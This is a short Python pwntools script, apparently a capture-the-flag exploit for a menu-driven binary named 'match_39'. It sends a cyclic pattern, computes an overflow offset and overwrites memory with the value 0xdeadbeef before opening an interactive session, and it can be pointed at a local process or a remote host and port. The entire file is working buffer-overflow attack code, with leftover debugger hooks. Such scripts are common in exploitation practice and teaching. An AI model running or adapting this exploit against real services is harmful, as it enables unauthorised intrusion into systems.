#!/usr/bin/env python
from pwn import *
import sys

context.terminal = ['tmux','splitw','-h']
context.log_level = 'debug'
gdb_bool = True
gdb_bool = False

def catch(data):
    r.sendlineafter("> ","1")
    r.sendlineafter("data: ",data)

def burn():
    r.sendlineafter("> ","2")

def exit():
    r.sendlineafter("> ","3")

def exploit(r):

    payload = cyclic(0x3f0)
    catch(payload)
    buf = cyclic_find("aada") * "A"
    buf += p32(0xdeadbeef)
    catch(buf)
    r.interactive()
    return


if __name__ == "__main__":
    log.info("For remote %s HOST PORT" % sys.argv[0])
    
    binary_name = "./match_39"        #put binary name here
    e = ELF(binary_name)

    if len(sys.argv) > 1:
        r = remote(sys.argv[1], int(sys.argv[2]))
        exploit(r)
    else:
        r = process(binary_name)
        print util.proc.pidof(r)
        gdb_cmd = [
            "b *0x0000555555554BDB",
            "c"


        ]
        if(gdb_bool):
            gdb.attach(r, gdbscript = "\n".join(gdb_cmd))
            #r =gdb.debug(binary_name, gdbscript = "\n".join(gdb_cmd))
        #r = process("./LOLgame", env={"LD_PRELOAD" : "./libc.so.6.remote"})
        #pause()
        exploit(r)

